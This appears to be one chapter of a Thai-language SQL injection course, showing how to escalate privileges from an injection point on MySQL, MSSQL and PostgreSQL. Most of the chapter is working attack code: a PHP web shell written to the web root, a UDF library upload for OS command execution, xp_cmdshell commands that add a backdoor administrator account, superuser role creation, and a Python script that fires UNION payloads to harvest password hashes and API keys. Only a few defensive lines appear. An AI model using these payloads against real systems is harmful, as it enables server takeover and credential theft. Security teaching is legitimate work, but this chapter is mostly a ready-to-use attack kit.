# Part 090: Privilege Escalation via SQL Injection

## ภาพรวม

หลังจาก initial injection — escalate สู่ DBA, OS, หรือ domain admin

**ขั้นตอนที่ 1421-1435**

---

## 1421. Database User Privilege Mapping

```sql
-- MySQL: ดู privileges ของ current user
SELECT user(), @@hostname;
SHOW GRANTS FOR CURRENT_USER();

-- ดู users ทั้งหมด:
SELECT user, host, Super_priv, File_priv, Grant_priv, Repl_slave_priv
FROM mysql.user;

-- PostgreSQL: ดู role privileges
SELECT rolname, rolsuper, rolcreatedb, rolcreaterole, rolcanlogin
FROM pg_roles;

-- MSSQL: ดู server roles
SELECT name, is_srvrolemember('sysadmin') as is_sysadmin
FROM sys.server_principals
WHERE type IN ('S','U');

-- MSSQL: ดู effective permissions:
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

---

## 1422. MySQL: GRANT Injection

```sql
-- ถ้า current user มี GRANT OPTION:
-- ไม่ต้อง inject GRANT โดยตรง แต่ใช้ FILE privilege

-- FILE privilege abuse:
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- UDF privilege escalation (ต้อง FILE + INSERT on mysql):
-- 1. Upload UDF library
SELECT UNHEX('...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so';
-- 2. สร้าง function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf_sys.so';
-- 3. Execute OS command
SELECT sys_exec('id > /tmp/id.txt');

-- Defense:
REVOKE FILE ON *.* FROM 'app_user'@'%';
SET GLOBAL secure_file_priv='/dev/null';  -- ปิด file access
```

---

## 1423. MSSQL: xp_cmdshell Escalation

```sql
-- xp_cmdshell path:
-- 1. Enable (ต้อง sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 2. Execute
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ss123 /add && net localgroup administrators hacker /add';

-- Impersonation escalation:
-- ถ้า user มี IMPERSONATE permission:
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
REVERT;

-- ดู impersonation permissions:
SELECT b.name as grantor, a.name as grantee, c.permission_name
FROM sys.server_permissions c
JOIN sys.server_principals a ON c.grantee_principal_id = a.principal_id
JOIN sys.server_principals b ON c.grantor_principal_id = b.principal_id
WHERE c.permission_name = 'IMPERSONATE';
```

---

## 1424. PostgreSQL: Role Escalation

```sql
-- ดู roles ที่ grant ให้ current user:
SELECT * FROM pg_auth_members WHERE member = (SELECT oid FROM pg_roles WHERE rolname = current_user);

-- ถ้า current role มี CREATEROLE:
CREATE ROLE superuser SUPERUSER;
GRANT superuser TO current_user;
SET ROLE superuser;

-- SECURITY DEFINER function escalation:
-- ถ้า vulnerable function ใช้ SECURITY DEFINER (runs as owner)
CREATE OR REPLACE FUNCTION public.do_admin_task(cmd TEXT)
RETURNS TEXT SECURITY DEFINER AS $$
  SELECT pg_read_file(cmd);
$$ LANGUAGE sql;
-- owner = superuser → function runs as superuser!
-- injection ใน cmd = อ่านได้ทุก file

-- Defense:
REVOKE CREATEROLE FROM app_role;
-- Review all SECURITY DEFINER functions:
SELECT nspname, proname, prosecdef FROM pg_proc JOIN pg_namespace ON pronamespace = pg_namespace.oid WHERE prosecdef;
```

---

## 1425. Credential Harvesting

```python
import requests

# ดึง credentials จากทุก DB เพื่อ escalate

HARVEST_QUERIES = {
    'mysql_users': "SELECT user, authentication_string FROM mysql.user",
    'pg_shadow': "SELECT usename, passwd FROM pg_shadow",  # superuser only
    'mssql_hashes': "SELECT name, password_hash FROM sys.sql_logins",
    'app_users': "SELECT username, password_hash FROM users",
    'api_keys': "SELECT key_name, api_key FROM api_credentials",
    'service_accounts': "SELECT username, password FROM service_accounts",
}

def harvest_credentials(url: str, sqli_param: str, union_cols: int = 3):
    results = {}
    
    for name, query in HARVEST_QUERIES.items():
        # Convert to UNION payload
        cols = ','.join([f'({query})', 'NULL', 'NULL'][:union_cols])
        payload = f"' UNION SELECT {cols}-- -"
        
        r = requests.get(url, params={sqli_param: payload}, timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            results[name] = r.text[:500]
    
    return results
```

---

## สรุป

Privilege Escalation via SQLi:
- **MySQL UDF** - FILE priv → upload SO → OS exec
- **MSSQL xp_cmdshell** - sysadmin → OS commands
- **MSSQL IMPERSONATE** - permission → run as SA
- **PostgreSQL SECURITY DEFINER** - function runs as owner
- **Defense** - least privilege, audit grants

---

*Part 090 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
